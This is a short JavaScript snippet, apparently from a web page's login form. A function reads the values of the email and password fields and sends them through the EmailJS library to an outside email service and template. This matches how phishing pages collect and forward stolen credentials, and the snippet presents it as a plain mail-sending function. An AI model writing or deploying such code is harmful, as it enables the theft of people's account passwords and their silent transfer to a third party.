function sendMail(){
    let parms = {
        email : document.getElementById("email").value,
        password : document.getElementById("password").value,
    }

    emailjs.send("service_tuysjwi","template_4oln9tt",parms)
}